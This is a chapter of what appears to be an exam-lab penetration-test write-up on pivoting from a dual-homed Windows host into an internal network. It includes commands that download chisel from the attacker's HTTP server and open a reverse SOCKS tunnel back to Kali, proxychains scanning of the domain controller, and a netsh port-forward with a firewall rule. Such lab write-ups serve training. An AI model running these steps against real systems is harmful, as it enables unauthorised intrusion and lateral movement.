# 05 — Pivot: chisel into `10.10.118.0/24`

MS01 has two network cards and Kali can reach only one of them. Everything after this chapter runs
through a SOCKS proxy that MS01 opens back to us.

## 5.1 The second network card

```powershell
ipconfig /all
```

Condensed:

| Interface | IPv4 | Gateway | DNS |
|---|---|---|---|
| NIC 1 — Kali-facing | `192.168.118.147/24` | `192.168.118.254` | — |
| NIC 2 — internal | `10.10.118.147/24` | **none** | `10.10.118.146` |

Two facts decide the design:

- **No gateway on NIC 2.** MS01 can reach `10.10.118.0/24` and nothing beyond it. It is not a router
  by default, so I cannot simply add a route and point Kali at it.
- **DNS is the DC.** `10.10.118.146` is `DC01.oscp.exam`, which confirms the domain controller's
  address without ever touching it.

The cheap host discovery is the neighbour table, before any scanning:

```powershell
arp -a
route print
```

`arp -a` only shows hosts MS01 has already talked to; a sweep of the /24 fills in the rest.

## 5.2 Reverse SOCKS with chisel

The direction matters: MS01 cannot accept inbound connections from Kali on the internal network, so
the tunnel is built **outbound** from MS01 and the listening end is on Kali.

On Kali, serve the binary over the existing HTTP server and start the chisel server:

```bash
cd ~/kit/lateral && python3 -m http.server 8000
```

```bash
chisel server -p 8001 --reverse
```

On MS01, fetch the client and connect back:

```powershell
curl.exe -O http://192.168.45.158:8000/chisel.exe
.\chisel.exe client 192.168.45.158:8001 R:socks
```

The client logs `socks proxy listening on 127.0.0.1:1080`. That is the whole tunnel: a SOCKS5
listener on Kali, with MS01 as the exit node on `10.10.118.0/24`.

Use `8001` for chisel and leave `8000` for the HTTP server — colliding them produces a bind error
that looks like a chisel failure.

## 5.3 proxychains

The default Kali config points at Tor. It has to become the chisel listener, and it has to be
`socks5` — `socks4` against chisel's SOCKS5 listener fails with unhelpful connection errors:

```ini
[ProxyList]
socks5 127.0.0.1 1080
```

Confirm the edit before blaming the tunnel:

```bash
tail -3 /etc/proxychains4.conf
```

## 5.4 Using it

Always `-q`: proxychains otherwise prints a banner per connection and drowns the tool output.

```bash
proxychains4 -q nxc smb 10.10.118.0/24
```

```bash
proxychains4 -q nmap -sT -Pn -p 88,135,139,389,445,464,636,3268,5985 --open 10.10.118.146
```

Two constraints worth remembering:

- Only **TCP connect** scanning works through SOCKS. `-sS`, `-O`, and most of `-A` do not; use
  `-sT -Pn`.
- ICMP does not traverse the proxy, so every host looks down until a TCP port answers. `-Pn` is
  mandatory, and a "dead" host is only dead on TCP.

The sweep returns the domain controller and a second member server. That second server is MS02 —
chapter 06.

## 5.5 The no-chisel alternative

If a tool refuses to work through proxychains, MS01 can forward a single port instead. As SYSTEM:

```powershell
netsh interface portproxy add v4tov4 listenaddress=192.168.118.147 listenport=5985 connectaddress=10.10.118.<ms02> connectport=5985
netsh advfirewall firewall add rule name="winrm-fwd" dir=in action=allow protocol=TCP localport=5985
```

Kali then talks to `192.168.118.147:5985` as if it were the internal host. It is one port per
command and it has to be removed afterwards:

```powershell
netsh interface portproxy reset
netsh advfirewall firewall delete rule name="winrm-fwd"
```

Slower to set up than chisel, but it survives tools that cannot be proxy-aware — and it is the
fallback when a SOCKS proxy breaks a protocol that needs real source addresses.
